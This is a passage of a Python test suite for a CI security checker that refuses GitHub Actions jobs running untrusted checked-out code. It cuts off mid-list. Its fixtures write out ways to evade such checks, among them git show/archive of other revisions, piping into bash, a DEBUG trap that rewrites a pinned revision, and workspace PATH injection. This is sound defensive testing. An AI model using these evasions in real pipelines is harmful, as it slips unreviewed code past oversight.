# for byte instead. A standalone workflow_call job's default checkout is its
# caller's repository, not this tree, so the rule does not apply there.
# ---------------------------------------------------------------------------
UNBOUND = "a backlog row cannot bind"


def observe_job(steps: str, files: dict | None = None) -> dict[str, str]:
    return {**backlog_relay("capability-floor-observe.yml", "observe", steps), **(files or {})}


def expect_backlog(job: dict[str, str], refused: bool, label: str) -> None:
    row = backlog_row(job, "capability-floor-observe.yml [workflow_dispatch]", "observe")
    if refused:
        expect_no_pending({**job, "pending.tsv": row}, label,
                          ("VIOLATION: capability-floor-observe.yml [workflow_dispatch]: job 'observe'", UNBOUND),
                          *PENDING_ARGS)
    else:
        expect({**job, "pending.tsv": row}, 0,
               ("PENDING: capability-floor-observe.yml [workflow_dispatch]: job 'observe'",), label, *PENDING_ARGS)


TOOL = {"scripts/tool.py": "print('tool')\n", "scripts/other.py": "print('other')\n"}
SPARSE_TOOL = "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: scripts/tool.py\n    sparse-checkout-cone-mode: false\n"
expect_backlog(observe_job("- uses: actions/checkout@v4\n- run: python3 scripts/tool.py", TOOL), True,
               "a backlog job that full-checkouts the scanned tree is refused, whatever its frozen kinds")
expect_backlog(observe_job("- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.sha }}\n"
                           "- run: python3 scripts/tool.py", TOOL), True,
               "a backlog job that full-checkouts github.sha is refused")
expect_backlog(observe_job(SPARSE_TOOL + "- run: python3 scripts/tool.py", TOOL), False,
               "a backlog job with an exact sparse checkout is ratcheted")
for label, command in (
    ("the canary's git show of a sparse-bound file at the dispatch commit",
     'git --no-replace-objects -C "$GITHUB_WORKSPACE" \\\n  show "$GITHUB_SHA:scripts/tool.py" > "$RUNNER_TEMP/t.py"'),
    ("a git show of a sparse-bound file at ${{ github.sha }}", "git show ${{ github.sha }}:scripts/tool.py > t.py"),
):
    expect_backlog(observe_job(SPARSE_TOOL + "- run: |\n    " + command.replace("\n", "\n    ") + "\n    python3 t.py", TOOL),
                   False, f"{label} is bound by the sparse checkout")
for label, command in (
    ("a git show of a path the sparse checkout does not bind", 'git show "$GITHUB_SHA:scripts/other.py" > t.py'),
    ("a git show at another revision", 'git show "HEAD~1:scripts/tool.py" > t.py'),
    ("a git show of a variable path", 'git show "$GITHUB_SHA:$TOOL" > t.py'),
    ("a git archive", 'git archive "$GITHUB_SHA" scripts | tar -x'),
    ("a git cat-file", 'git cat-file -p "$GITHUB_SHA:scripts/tool.py" > t.py'),
):
    expect_backlog(observe_job(SPARSE_TOOL + "- run: " + command, TOOL), True,
                   f"{label} materializes tracked content no backlog row binds and is refused")
# The shell expands `$TOOL` before git sees it, so even a tracked file named
# literally `scripts/$TOOL` is not what a `git show` of that spelling reads.
LITERAL_DOLLAR = {"scripts/$TOOL": "print('literal')\n"}
expect_backlog(observe_job(SPARSE_TOOL.replace("scripts/tool.py", "'scripts/$TOOL'")
                           + '- run: git show "$GITHUB_SHA:scripts/$TOOL" > t.py', LITERAL_DOLLAR),
               True, "a git show path the shell expands is refused even when a file of that literal name is bound")
expect_backlog(observe_job(SPARSE_TOOL.replace("scripts/tool.py", "scripts/run.sh") + "- run: bash scripts/run.sh",
                           {**TOOL, "scripts/run.sh": 'git show "$GITHUB_SHA:scripts/other.py" > t.py\n'}),
               True, "a git show inside a script the job runs is refused too")
# A standalone workflow_call job checks out its caller's repository, so this
# rule does not reach it; that exposure is the relay backlog's (#1831).
CALLER_TREE = {
    "container-candidate.yml": """
        on: workflow_call
        jobs:
          pull-request-build:
            runs-on: [self-hosted, general]
            steps:
              - uses: actions/checkout@v4
              - run: docker build .
    """,
}
CALLER_LABEL = ("container-candidate.yml [workflow_call]", "pull-request-build")
expect({**CALLER_TREE, "pending.tsv": backlog_row(CALLER_TREE, *CALLER_LABEL)}, 0,
       ("PENDING: container-candidate.yml [workflow_call]: job 'pull-request-build'",),
       "a standalone workflow_call job's checkout of its caller's repository is not refused as this tree",
       *PENDING_ARGS)

# Round-6 should-fix: `-e` is errexit to a shell, not inline code, so
# `bash -e tools/x.sh` runs the script and head detection must read it. For
# node, perl, and ruby `-e` is inline code (already in the step text), and a
# shell's `-c` is inline code too.
for label, step, followed in (
    ("bash -e", "- run: bash -e tools/x.sh", True),
    ("sh -eu", "- run: sh -eu tools/x.sh", True),
    ("bash -euo pipefail", "- run: bash -eu tools/x.sh", True),
    ("bash -ec inline", "- run: bash -ec 'echo tools/x.sh'", False),
    ("node -e inline", "- run: node -e 'console.log(1)' tools/x.sh", False),
):
    job = {**backlog_relay("capability-floor-observe.yml", "observe", SPARSE_TOOLS + step),
           "tools/x.sh": 'gh pr checkout "$PR"\n'}
    code, output = run_checker(job)
    if (RELAY_REFUSAL in output) == followed and code == 1:
        ok(f"`{label}` {'runs the script, so head detection reads it' if followed else 'is inline code'}")
    else:
        fail(f"`{label}` should {'' if followed else 'not '}be followed (got {code}: {output.strip()[:300]})")

# Round-6 should-fix: head detection never reads a program through a link that
# leaves the scanned tree; those are the scanner host's bytes. The sparse
# closure binds the link text and flags it unscanned instead.
with tempfile.TemporaryDirectory() as outside:
    write_file(os.path.join(outside, "host.sh"), 'gh pr checkout "$PR"\n')
    code, output = linked_run(sparse_steps("scripts/l"), {"scripts/l": os.path.join(outside, "host.sh")})
if code == 1 and "unscanned-path" in output and HEAD_DIAG not in output:
    ok("head detection does not read a program through an absolute link out of the tree")
else:
    fail(f"head detection read a program through a link out of the tree (got {code}: {output.strip()[:400]})")
with tempfile.TemporaryDirectory() as outside:
    write_file(os.path.join(outside, "host.sh"), 'gh pr checkout "$PR"\n')
    code, output = linked_run(sparse_steps("scripts/d/host.sh"), {"scripts/d": outside})
if code == 1 and "unscanned-path" in output and HEAD_DIAG not in output:
    ok("head detection does not read a program through a linked directory out of the tree")
else:
    fail(f"head detection read a program through a linked directory (got {code}: {output.strip()[:400]})")
code, output = linked_run(sparse_steps("scripts/l"), {"scripts/l": "inner.sh"},
                          files={"scripts/inner.sh": 'gh pr checkout "$PR"\n'})
if code == 1 and HEAD_DIAG in output:
    ok("head detection still reads a program through a link that stays in the tree")
else:
    fail(f"head detection stopped reading an in-tree link (got {code}: {output.strip()[:400]})")

# ---------------------------------------------------------------------------
# PM decision on #1827 round 6: release.yml's `verify` needs the whole tree
# (it runs the repository's release suite on the commit that is tagged) and is
# generator-pinned, so it alone tolerates `full-checkout` until #1831 moves it
# off the persistent pool. Its row binds the job and the bytes of every
# program it runs from the tree, never the whole tree.
# ---------------------------------------------------------------------------
VERIFY_LABEL = ("release.yml [workflow_dispatch]", "verify")
VERIFY_FILES = (
    "scripts/release-verify.sh",
    "scripts/changelog.py",
    "scripts/render-next.sh",
    "scripts/gen-adr-index.sh",
    "scripts/adr-relative-links.test.py",
    "scripts/doc-fragment-names.test.sh",
    "scripts/doc-fragment-names.sh",
    "scripts/ci-gate/contract-tools-package.test.js",
    "bin/render-next.js",
    "bin/gen-adr-index.js",
    "scripts/gen-changelog-caller.sh",
    # A bare name would land in .github/workflows; this is the repository root.
    "./package.json",
)
VERIFY = {"release.yml": live(".github/workflows/release.yml"), **{path: live(path) for path in VERIFY_FILES}}
# release.yml's snapshot and publish are backlog jobs too; their rows keep
# the fixture about verify alone.
VERIFY_ROW = "".join(backlog_row(VERIFY, "release.yml [workflow_dispatch]", job)
                     for job in ("verify", "snapshot", "publish"))


def expect_verify_refused(workflows: dict[str, str], label: str, fragments: tuple[str, ...]) -> None:
    """Exit 1 with the fragments and no PENDING line for verify itself."""
    actual, output = run_checker(workflows, *PENDING_ARGS)
    missing = [fragment for fragment in fragments if fragment not in output]
    if actual != 1 or missing or "PENDING: release.yml [workflow_dispatch]: job 'verify'" in output:
        fail(f"{label} (expected exit 1 with {missing or fragments} and verify not PENDING, got {actual}: "
             f"{output.strip()[:600]})")
    else:
        ok(label)
expect({**VERIFY, "pending.tsv": VERIFY_ROW}, 0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "release.yml verify, the one key that tolerates full-checkout, is ratcheted by its row", *PENDING_ARGS)
expect_verify_refused(
    {**VERIFY, "pending.tsv": VERIFY_ROW,
     "scripts/release-verify.sh": VERIFY["scripts/release-verify.sh"] + 'gh pr checkout "$PR"\n'},
    # Since round 8 a runtime tree change in a traced program refuses before
    # any row is read, so `gh pr checkout` no longer merely stales the row.
    "release.yml verify refuses gh pr checkout appended to release-verify.sh, before reading its row",
    ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", "changes the checked-out tree"),
)
expect_verify_refused(
    {**VERIFY, "pending.tsv": VERIFY_ROW,
     "scripts/render-next.sh": VERIFY["scripts/render-next.sh"] + "echo changed\n"},
    "release.yml verify's row stops applying when a script release-verify.sh runs changes",
    ("pending row no longer applies",),
)
expect_verify_refused(
    {**VERIFY, "pending.tsv": VERIFY_ROW,
     "scripts/doc-fragment-names.sh": VERIFY["scripts/doc-fragment-names.sh"] + "echo changed\n"},
    "release.yml verify's row stops applying when a script reached through \"$repo_root/…\" changes",
    ("pending row no longer applies",),
)
expect({**VERIFY, "pending.tsv": VERIFY_ROW, "docs/unrelated.md": "# not run by verify\n"}, 0,
       ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "release.yml verify's row does not bind tree bytes it does not run (no whole-tree digest)", *PENDING_ARGS)
# The tolerance is the key's own: a git show/archive/cat-file in a step is
# still refused for verify, because only full-checkout was granted.
expect_verify_refused(
    {**VERIFY, "pending.tsv": VERIFY_ROW,
     "release.yml": VERIFY["release.yml"].replace(
         "          if [ -x scripts/release-verify.sh ]; then\n",
         '          git archive "$GITHUB_SHA" scripts | tar -x\n          if [ -x scripts/release-verify.sh ]; then\n', 1)},
    "release.yml verify's full-checkout tolerance does not extend to a git archive",
    ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNBOUND),
)

# ---------------------------------------------------------------------------
# Round-7 finding 2: a materialization inside a program verify runs refuses.
# The hook's one `git show "$pin:…" | bash` (the pinned generator compared
# against release.yml) is a frozen, reviewed exception matched on its exact
# bytes and on $pin coming from release.yml's 40-hex header pin.
# ---------------------------------------------------------------------------
HOOK = VERIFY["scripts/release-verify.sh"]
SHOW_LINE = next(line for line in HOOK.splitlines() if line.startswith('git show "$pin:'))
# The whole logical line: the show continues onto the `|| { … }` that follows.
SHOW_LOGICAL = SHOW_LINE + "\n" + HOOK.split(SHOW_LINE + "\n", 1)[1].split("\n", 1)[0]
MATERIALIZES = "materializes tracked content"
for label, hook, release in (
    ("an injected git archive in the hook", HOOK + "git archive HEAD scripts | tar -x\n", None),
    ("a second, byte-identical git show of the pin", HOOK.replace(SHOW_LOGICAL, SHOW_LOGICAL + "\n" + SHOW_LOGICAL, 1),
     None),
    ("a second git show of the pin naming another file",
     HOOK + 'git show "$pin:scripts/render-next.sh" | bash\n', None),
    ("an edit to the tolerated line's bytes", HOOK.replace(SHOW_LINE, SHOW_LINE.replace("cmp -s -", "cmp -s  -"), 1), None),
    ("an edit to the line that derives $pin", HOOK.replace('pin="$(sed -nE', 'pin="${PIN_OVERRIDE:-$(sed -nE', 1).replace(
        '.github/workflows/release.yml)"\n', '.github/workflows/release.yml)}"\n', 1), None),
    ("a release.yml header pin that is not 40-hex", HOOK,
     re.sub(r"release-node [0-9a-f]{40} ", "release-node main ", VERIFY["release.yml"], count=1)),
    # Round-8 finding 5: the derivation is the only assignment to $pin, and
    # nothing before the show can change what $pin holds when it runs.
    ("a `pin=HEAD` between the derivation and the show",
     HOOK.replace(SHOW_LINE, "pin=HEAD\n" + SHOW_LINE, 1), None),
    ("a `pin=HEAD` after the show", HOOK + "pin=HEAD\n", None),
    ("a DEBUG trap ahead of the derivation that rewrites $pin",
     HOOK.replace("set -euo pipefail\n", "set -euo pipefail\ntrap 'pin=HEAD' DEBUG\n", 1), None),
    ("a `sed` function ahead of the derivation",
     HOOK.replace("set -euo pipefail\n", "set -euo pipefail\nsed() { echo HEAD; }\n", 1), None),
    ("an edit to the guard between the derivation and the show",
     HOOK.replace("carries no package-release pin header", "carries no pin header", 1), None),
):
    expect_verify_refused(
        {**VERIFY, "pending.tsv": VERIFY_ROW, "scripts/release-verify.sh": hook,
         **({"release.yml": release} if release else {})},
        f"verify refuses {label}",
        ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", MATERIALIZES),
    )
# The pin the show reads comes from release.yml, so verify's row binds all of
# release.yml as the frozen pin source, not only the verify job's own text.
expect_verify_refused(
    {**VERIFY, "pending.tsv": VERIFY_ROW,
     "release.yml": VERIFY["release.yml"].replace("\n", "\n# an edit outside every job\n", 1)},
    "verify's row binds release.yml, the source of the frozen $pin",
    ("pending row no longer applies",),
)

# ---------------------------------------------------------------------------
# Round-7 finding 1: verify runs JavaScript. contract-tools-package.test.js
# packs the package (`npm pack`) and runs its bins, which run changelog.py and
# gen-adr-index.sh, so the row binds everything `files` and `bin` select, and a
# spawn target the trace cannot read refuses as unresolved-program.
# ---------------------------------------------------------------------------
CONTRACT_TEST = "scripts/ci-gate/contract-tools-package.test.js"
for bin_file in ("bin/render-next.js", "bin/gen-adr-index.js"):
    expect_verify_refused({**VERIFY, "pending.tsv": VERIFY_ROW, bin_file: VERIFY[bin_file] + "// changed\n"},
                          f"verify's row stops applying when the packed bin {bin_file} changes",
                          ("pending row no longer applies",))
# A bin run and a pack, each alone, in a hook of their own: running the bin
# binds and follows it, and packing binds every file `files` selects, even one
# nothing else reaches.
PACKAGE = json.dumps({"name": "@verjson/fixture", "bin": {"extra": "bin/extra.js"},
                      "files": ["bin/", "lib/"]})
OWN_HOOK = {
    **VERIFY,
    "./package.json": PACKAGE,
    "bin/extra.js": "#!/usr/bin/env node\nconsole.log('extra');\n",
    "lib/data.txt": "packed data\n",
}
for label, hook, program, edited in (
    ("running a package bin", "node scripts/runbin.js\n",
     'const { spawnSync } = require("node:child_process");\nconst path = require("node:path");\n'
     'spawnSync(path.join(process.cwd(), "node_modules/.bin/extra"), []);\n', "bin/extra.js"),
    ("packing the package", "node scripts/packer.js\n",
     'const { spawnSync } = require("node:child_process");\nspawnSync("npm", ["pack", "--ignore-scripts"]);\n',
     "lib/data.txt"),
):
    fixture = {**OWN_HOOK, "scripts/release-verify.sh": "#!/usr/bin/env bash\n" + hook,
               "scripts/" + hook.split("scripts/")[1].split("\n")[0]: program}
    rows = "".join(backlog_row(fixture, "release.yml [workflow_dispatch]", job) for job in ("verify", "snapshot", "publish"))
    expect({**fixture, "pending.tsv": rows}, 0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
           f"a hook {label} is ratcheted", *PENDING_ARGS)
    expect_verify_refused({**fixture, "pending.tsv": rows, edited: fixture[edited] + "// changed\n"},
                          f"{label} binds {edited}", ("pending row no longer applies",))
for label, line, fragment in (
    ("a spawn of a computed program", "spawnSync(toolFromEnvironment, []);\n", "unresolved-program"),
    ("a computed require", "require(modulePath);\n", "unresolved-program"),
    ("an npx spawn", 'spawnSync("npx", ["some-tool"]);\n', "unresolved-program"),
    ("a git show spawn", 'spawnSync("git", ["show", "HEAD:scripts/changelog.py"]);\n', "materializes tracked content"),
):
    expect_verify_refused(
        {**VERIFY, "pending.tsv": VERIFY_ROW, CONTRACT_TEST: VERIFY[CONTRACT_TEST] + line},
        f"verify refuses {label} in the JavaScript it runs",
        ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", fragment),
    )

# ---------------------------------------------------------------------------
# Round-7 findings 3 and 4: verify's trace follows each program from the
# shallowest depth it is reached at, whatever order discovery meets it in, and
# every invocation form it cannot resolve refuses as `unresolved-program`.
# ---------------------------------------------------------------------------
UNRESOLVED = "unresolved-program"


def verify_with(hook_tail: str, files: dict[str, str]) -> dict[str, str]:
    """The verify fixture with lines appended to release-verify.sh."""
    workflows = {**VERIFY, "scripts/release-verify.sh": HOOK + hook_tail, **files}
    rows = "".join(backlog_row(workflows, "release.yml [workflow_dispatch]", job)
                   for job in ("verify", "snapshot", "publish"))
    return {**workflows, "pending.tsv": rows}


def expect_bound(hook_tail: str, files: dict[str, str], edited: str, label: str) -> None:
    fixture = verify_with(hook_tail, files)
    expect({**fixture}, 0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
           f"{label}: the unedited fixture is ratcheted", *PENDING_ARGS)
    change = {".py": "print('changed')\n", ".js": "// changed\n"}.get(os.path.splitext(edited)[1], "echo changed\n")
    expect_verify_refused({**fixture, edited: fixture[edited] + change},
                          f"{label}: editing {edited} stops the row applying", ("pending row no longer applies",))


# Finding 3: zz-a.sh is first met as a data token in the hook's echo, then run;
# it must still be followed into zz-b.sh.
# (The reviewer's repro: the hook's echo names zz-a.sh, which a script the
# hook runs then runs; the old trace bound it as data and never followed it.)
expect_bound('echo "runs scripts/zz-a.sh"\nbash scripts/zz-sub.sh\n',
             {"scripts/zz-sub.sh": "bash scripts/zz-a.sh\n", "scripts/zz-a.sh": "bash scripts/zz-b.sh\n",
              "scripts/zz-b.sh": "echo b\n"},
             "scripts/zz-b.sh", "a program first met as a data token is still followed")
# A chain deeper than the cap still runs something: refused, never truncated.
CHAIN = {f"scripts/c{level}.sh": f"bash scripts/c{level + 1}.sh\n" for level in range(1, 6)}
CHAIN["scripts/c6.sh"] = "echo end\n"
expect_verify_refused(verify_with("bash scripts/c1.sh\n", CHAIN),
                      "a program chain nested beyond the depth cap refuses as unresolved",
                      ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED, "nested beyond"))
# Finding 4: each form, at depth 2 (inside a script the hook runs) and at 1.
for label, sub, extra, edited in (
    ("source at depth 2", "source scripts/f.sh\n", {}, "scripts/f.sh"),
    ("bash -c at depth 2", 'bash -c "scripts/f.sh"\n', {}, "scripts/f.sh"),
    ("an assigned path at depth 2", 'f=scripts/f.sh; bash "$f"\n', {}, "scripts/f.sh"),
    ("python -m at depth 2", "python3 -m scripts.fmod\n", {"scripts/fmod.py": "print(1)\n"}, "scripts/fmod.py"),
):
    expect_bound("bash scripts/sub.sh\n", {"scripts/sub.sh": sub, "scripts/f.sh": "echo f\n", **extra},
                 edited, f"verify follows {label}")
expect_bound("python3 -m scripts.fmod\n", {"scripts/fmod.py": "import scripts.fhelper\n",
                                            "scripts/fhelper.py": "print(1)\n"},
             "scripts/fhelper.py", "verify follows python -m at depth 1 into its imports")
expect_bound(". scripts/f.sh\n", {"scripts/f.sh": "bash scripts/g.sh\n", "scripts/g.sh": "echo g\n"},
             "scripts/g.sh", "verify follows a file sourced with . at depth 1")
for label, sub in (
    ("eval", 'eval "$command"\n'),
    ("an unresolvable variable path", 'bash "$UNSET_ROOT/x.sh"\n'),
    ("xargs", "printf x | xargs bash\n"),
    ("a pipe into bash", "cat scripts/f.sh | bash\n"),
    ("a computed python import", "python3 -c 'import importlib; importlib.import_module(name)'\n"),
    ("an untraced interpreter", "perl scripts/f.pl\n"),
    ("npx", "npx some-tool\n"),
):
    expect_verify_refused(verify_with("bash scripts/sub.sh\n", {"scripts/sub.sh": sub, "scripts/f.sh": "echo f\n"}),
                          f"verify refuses {label} as an unresolved program",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED))

# ---------------------------------------------------------------------------
# Round-8 finding 1 (PM design): any literal in a traced program text that
# names a tracked program is bound and followed, whatever invokes it, so the
# invocation form never decides whether an edit stales the row.
# ---------------------------------------------------------------------------
EVIL = {"scripts/evil.sh": "echo evil\n"}
for label, hook, files in (
    ("a JavaScript spawn of a literal path", "node scripts/probe.js\n",
     {"scripts/probe.js": 'const { spawnSync } = require("node:child_process");\nspawnSync("./scripts/evil.sh");\n'}),
    ("a Python argv list naming a literal path", "python3 scripts/probe.py\n",
     {"scripts/probe.py": 'import subprocess\nsubprocess.run(["scripts/evil.sh"])\n'}),
    ("a Python string command naming a literal path", "python3 scripts/probe.py\n",
     {"scripts/probe.py": 'import subprocess\nsubprocess.run("scripts/evil.sh")\n'}),
    ("an aliased subprocess call", "python3 scripts/probe.py\n",
     {"scripts/probe.py": 'import subprocess as sp\nsp.check_call(["bash", "scripts/evil.sh"])\n'}),
    ("find -exec", "find . -name x -exec scripts/evil.sh {} +\n", {}),
    ("a deeper script that only names it in data", "bash scripts/sub.sh\n",
     {"scripts/sub.sh": 'run_later="scripts/evil.sh"\necho "$run_later" >/dev/null\n'}),
):
    expect_bound(hook, {**EVIL, **files}, "scripts/evil.sh", f"verify binds a program named by {label}")

# Round-8 finding 2: the materialization scan reads `git` behind a path or a
# quote, and a runtime tree change in a traced program refuses too.
for label, line, fragment in (
    ("/usr/bin/git show", "/usr/bin/git show HEAD:scripts/changelog.py > /tmp/x\n", "materializes tracked content"),
    ('a quoted "git" show', '"git" show HEAD:scripts/changelog.py > /tmp/x\n', "materializes tracked content"),
    ("git checkout <rev> -- path", "git checkout HEAD~1 -- scripts/changelog.py\n", "changes the checked-out tree"),
    ("git restore --source", "git restore --source=HEAD~1 scripts/changelog.py\n", "changes the checked-out tree"),
):
    expect_verify_refused(verify_with("bash scripts/sub.sh\n", {"scripts/sub.sh": line}),
                          f"verify refuses {label} in a program it runs",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", fragment))

# Round-8 finding 3: aliased spawns are recognized, per file, and a spawn or
# exec on an object the trace cannot identify refuses.
for label, files in (
    ("an `import subprocess as` alias with a computed argv",
     {"scripts/probe.py": "import subprocess as sp\nsp.run(command)\n"}),
    ("a `from subprocess import run` alias with a computed argv",
     {"scripts/probe.py": "from subprocess import run\nrun(command)\n"}),
    ("a computed spawn after nested inline Python",
     {"scripts/probe.py": "from subprocess import run\nimport os\n"
                          "os.system(\"python3 -c 'import json'\")\nrun(command)\n"}),
):
    expect_verify_refused(verify_with("python3 scripts/probe.py\n", files),
                          f"verify refuses {label}", ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED))
expect_verify_refused(
    verify_with("node scripts/probe.js\n", {"scripts/probe.js": 'const cp = require("node:child_process");\n'
                                                               "cp.spawnSync(tool, []);\n"}),
    "verify refuses a spawn on a child_process object under another name",
    ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED),
)
expect_verify_refused(
    verify_with("node scripts/probe.js\n", {"scripts/probe.js": 'require("node:child_process").execSync(command);\n'}),
    "verify refuses a spawn on the result of a call",
    ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED),
)

# Round-8 finding 4: `npm pack` runs the package's prepack, prepare and
# postpack scripts unless --ignore-scripts, exactly as install runs its own.
# (prepare is also reached by verify's own `npm rebuild` step.)


def with_scripts(scripts: dict[str, str]) -> str:
    """The verify fixture's package.json, with these scripts added."""
    package = json.loads(VERIFY["./package.json"])
    return json.dumps({**package, "scripts": {**package.get("scripts", {}), **scripts}})


for script in ("prepack", "prepare", "postpack"):
    expect_verify_refused(
        verify_with("npm pack\n", {"./package.json": with_scripts({script: "bash \"$TOOL\""})}),
        f"verify refuses an `npm pack` whose {script} script runs a computed program",
        ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED),
    )
expect(verify_with("npm pack --ignore-scripts\n", {"./package.json": with_scripts({"prepack": "bash \"$TOOL\""})}),
       0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "an `npm pack --ignore-scripts` does not trace the lifecycle scripts it skips", *PENDING_ARGS)

# Round-8 finding 6: a program reached through a symbolic link binds the link
# and its target's bytes and is followed into the target; a link out of the
# tree, or a broken one, is a program the row cannot bind.
expect_bound("bash scripts/link.sh\n", {"scripts/link.sh": Link("real.sh"), "scripts/real.sh": "echo real\n"},
             "scripts/real.sh", "a program run through a symlink")
expect_bound('echo "see scripts/link.sh"\n',
             {"scripts/link.sh": Link("real.sh"), "scripts/real.sh": "echo real\n"},
             "scripts/real.sh", "a symlink named literally")
LINK_OUT = "is a symbolic link out of the scanned tree"
for label, files, reason in (
    ("a symlinked program whose target runs a computed program",
     {"scripts/link.sh": Link("real.sh"), "scripts/real.sh": 'bash "$TOOL"\n'}, "scripts/real.sh"),
    ("a symlinked program pointing out of the tree", {"scripts/link.sh": Link("/etc/hostname")}, LINK_OUT),
    ("a symlinked program pointing up out of the tree", {"scripts/link.sh": Link("../../outside.sh")}, LINK_OUT),
    ("a broken symlinked program", {"scripts/link.sh": Link("missing.sh")}, LINK_OUT),
    ("a looping symlinked program", {"scripts/link.sh": Link("loop.sh"), "scripts/loop.sh": Link("link.sh")}, LINK_OUT),
):
    expect_verify_refused(verify_with("bash scripts/link.sh\n", files), f"verify refuses {label}",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED, reason))

# Round-8 nit 9: `bash -s` takes its program from standard input and its
# operands as arguments, never as a script path; a pipe into it has a reason
# of its own.
expect_verify_refused(verify_with("produce | bash -s some-argument\n", {}),
                      "verify refuses `bash -s` reading a piped program, with its own reason",
                      ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED, "`-s` reads its program"))
expect_bound("bash -s some-argument < scripts/real.sh\n", {"scripts/real.sh": "echo real\n"},
             "scripts/real.sh", "`bash -s` reading a tracked program on standard input")

# Round-8 nit 10: npm run in another package directory reads that package's
# scripts, which this trace does not model, so it refuses rather than read the
# root package.json in their place.
SUB_PACKAGE = {"sub/package.json": json.dumps({"name": "sub", "scripts": {"build": 'bash "$TOOL"'}})}
for invocation in ("npm --prefix sub run build", "npm run build --prefix=sub", "npm -C sub run build",
                   "npm run build --workspace sub", "npm run build --workspaces", "npm pack -w=sub"):
    expect_verify_refused(verify_with(invocation + "\n", SUB_PACKAGE), f"verify refuses `{invocation}`",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED,
                           "another package directory"))
expect(verify_with("npm version --prefix sub 1.0.0 --ignore-scripts\n", SUB_PACKAGE),
       0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "an npm verb in another package directory that runs no package script is not refused", *PENDING_ARGS)

# Round-8 residual (a): a bare command word resolves through PATH, so a PATH
# entry inside the workspace would run tracked bytes no literal names. Such an
# entry refuses; an entry outside the workspace does not.
for label, line in (
    ("an exported PATH led by the workspace", 'export PATH="$GITHUB_WORKSPACE/bin:$PATH"'),
    ("a braced workspace PATH entry", 'export PATH="${GITHUB_WORKSPACE}/bin:${PATH}"'),
    ("a PATH prefix assignment with a relative entry", "PATH=scripts:$PATH tool"),
    ("a PATH entry from the working directory", 'PATH="$(pwd)/bin:$PATH"'),
    ("a workspace directory appended to GITHUB_PATH", 'echo "$PWD/bin" >> "$GITHUB_PATH"'),
    # Round-9 nits: an empty entry is the working directory, and += appends.
    ("a trailing empty PATH entry", 'export PATH="$PATH:"'),
    ("a leading empty PATH entry", 'PATH=":$PATH"'),
    ("an empty PATH entry in the middle", 'PATH="/usr/bin::/bin"'),
    ("a PATH += append of a relative entry", "PATH+=:scripts"),
    ("a relative directory appended to GITHUB_PATH with printf", "printf 'bin\\n' >> $GITHUB_PATH"),
):
    expect_verify_refused(verify_with(line + "\n", {}), f"verify refuses {label}",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED,
                           "puts the workspace on PATH"))
ENV_PATH = verify_with("", {})
ENV_PATH["release.yml"] = ENV_PATH["release.yml"].replace(
    "          NODE_AUTH_TOKEN: ''\n", "          NODE_AUTH_TOKEN: ''\n          PATH: scripts:/usr/bin\n", 1)
expect_verify_refused(ENV_PATH, "verify refuses a step env PATH with a relative entry",
                      ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED, "puts the workspace on PATH"))
expect(verify_with('export PATH="/usr/local/bin:$HOME/.local/bin:$PATH"\n', {}),
       0, ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "a PATH entry outside the workspace is not refused", *PENDING_ARGS)

# Round-8 mutation survivors. The literal rule binds a sourced or `bash -c`
# program whatever form reaches it, but only the invoked trace refuses what it
# composes; a bare file name next to the program naming it is a literal; and a
# link without a program extension is a program when its target is one.
for label, line, files in (
    ("a computed program inside `bash -c`", "bash -c 'bash \"$TOOL\"'\n", {}),
    ("a computed program in a sourced file", "source scripts/zz-sourced.sh\n",
     {"scripts/zz-sourced.sh": 'bash "$TOOL"\n'}),
    ("a computed program in a dot-sourced file", ". scripts/zz-sourced.sh\n",
     {"scripts/zz-sourced.sh": 'bash "$TOOL"\n'}),
):
    expect_verify_refused(verify_with(line, files), f"verify refuses {label}",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED))
expect_bound('echo "see zz-bare.sh"\n', {"scripts/zz-bare.sh": "echo bare\n"}, "scripts/zz-bare.sh",
             "a bare program file name beside the program naming it")
expect_bound('echo "see scripts/zz-tool"\n', {"scripts/zz-tool": Link("real.sh"), "scripts/real.sh": "echo real\n"},
             "scripts/real.sh", "an extensionless link to a program, named literally")

# Round-9 blocker (PM decision): a target reached through an invocation form
# the trace recognizes is followed as invoked, so what it composes refuses; a
# bare mention no invocation wraps is the only literal followed as named.
COMPUTED_TARGET = {"scripts/zz-target.sh": 'bash "$TOOL"\n'}
for label, hook, files in (
    ("a Python argv list", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": 'import subprocess\nsubprocess.run(["scripts/zz-target.sh"])\n'}),
    ("a Python argv string", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": 'import subprocess\nsubprocess.run("scripts/zz-target.sh")\n'}),
    ("a Python argv list with arguments", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": 'import subprocess\nsubprocess.check_call(["./scripts/zz-target.sh", "--x"])\n'}),
    ("a JavaScript spawn", "node scripts/zz-spawn.js\n",
     {"scripts/zz-spawn.js": 'const { spawnSync } = require("node:child_process");\nspawnSync("./scripts/zz-target.sh");\n'}),
